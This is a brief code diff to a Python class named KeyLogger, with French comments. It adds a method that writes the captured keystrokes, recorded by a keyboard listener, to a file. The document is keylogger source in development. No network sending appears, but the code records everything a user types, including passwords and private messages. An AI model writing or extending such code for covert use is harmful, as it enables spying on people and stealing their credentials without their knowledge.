@@ -20,6 +20,12 @@ class KeyLogger:
 
         self.listener = keyboard.Listener(on_press=on_press)
 
+    def write_on_file(self,filename):
+            with open(filename,'w') as f:
+                for key in self.keys:
+                    f.write(key)
+                    f.write("\n")
+
     def start(self):
         """
         permet de démarrer le keylogger
